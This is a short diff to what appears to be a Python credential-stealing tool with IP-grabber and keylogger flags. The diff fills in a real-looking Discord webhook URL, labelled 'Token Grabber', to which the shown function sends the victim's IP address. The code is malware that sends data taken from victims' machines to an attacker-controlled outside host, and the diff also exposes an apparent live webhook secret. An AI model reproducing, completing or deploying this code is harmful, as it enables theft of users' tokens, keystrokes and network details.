@@ -20,9 +20,9 @@ ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "ChangeMe", "webhook-name": "ChangeMe"}
+ext = {"webhook-id": "https://discord.com/api/webhooks/867399665963761665/V7-WSXXl7chFffN0f22lOWtKtQd0a-rYh6Gty7zmJRyeYpgtJq-CxfwifxxkP55GXWOm", "webhook-name": "Token Grabber"}
 
-os.system('title TITLE OF THE APP')
+os.system('Token Grabber')
 
 def ip_grabber():
     webhook = DiscordWebhook(url=ext['webhook-id'], content=f"User IP Address: {IPAddr}",  username=ext['webhook-name'])
